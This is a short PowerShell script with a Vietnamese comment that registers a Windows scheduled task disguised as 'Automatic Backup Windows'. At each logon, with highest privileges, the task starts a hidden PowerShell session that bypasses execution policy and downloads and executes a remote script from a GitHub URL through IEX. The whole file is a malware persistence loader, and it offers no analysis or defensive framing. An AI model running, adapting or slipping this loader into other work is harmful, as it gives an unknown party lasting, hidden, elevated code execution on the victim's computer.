$powershellcode = "https://raw.githubusercontent.com/43a1723/test/main/download.ps1"
$download = "(New-Object Net.WebClient).DownloadString('$powershellcode')"
$arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `& { IEX $download }"

$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $arguments
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_name = "Automatic Backup Windows"  # Thay đổi giá trị này thành một tên duy nhất cho tác vụ
$task_desc = "Always Backup & Fix If Windows ERROR."
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable

Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null

